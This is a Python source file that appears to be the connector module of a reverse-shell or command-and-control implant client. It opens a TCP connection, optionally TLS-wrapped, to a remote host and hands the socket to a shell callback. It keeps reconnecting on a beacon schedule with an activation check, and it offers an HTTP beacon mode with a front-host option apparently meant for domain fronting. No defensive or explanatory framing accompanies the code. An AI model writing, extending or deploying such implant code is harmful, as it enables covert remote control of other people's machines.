import socket
import time


def connect_and_run(host, port, shell_callback, reconnect_interval=5,
                    encryption=False, tls=False, http_mode=False,
                    front_host=None, beacon_config=None):
    if http_mode:
        _http_beacon(host, port, shell_callback, reconnect_interval,
                     encryption, tls, front_host)
        return

    first_attempt = True
    while True:
        sock = None
        try:
            if not first_attempt:
                if beacon_config:
                    time.sleep(beacon_config.get_sleep())
                else:
                    time.sleep(reconnect_interval)
            first_attempt = False

            if beacon_config and not beacon_config.should_activate():
                time.sleep(30)
                continue

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((host, port))
            sock.settimeout(None)

            if tls:
                from client.core.tls import wrap_client_socket
                sock = wrap_client_socket(sock, hostname=host)

            shell_callback(sock, encryption, tls, http_mode=False)
            if sock:
                sock.close()
            break
        except (socket.timeout, ConnectionRefusedError, OSError):
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass
        except Exception:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass
            raise


def _http_beacon(host, port, shell_callback, reconnect_interval,
                 encryption, tls, front_host):
    scheme = 'https' if tls else 'http'
    server_url = f'{scheme}://{host}:{port}'

    from common.http_protocol import HttpBeaconProtocol
    protocol = HttpBeaconProtocol(
        server_url=server_url,
        front_host=front_host,
        sleep_time=reconnect_interval,
    )
    shell_callback(protocol, encryption=False, tls=False, http_mode=True)
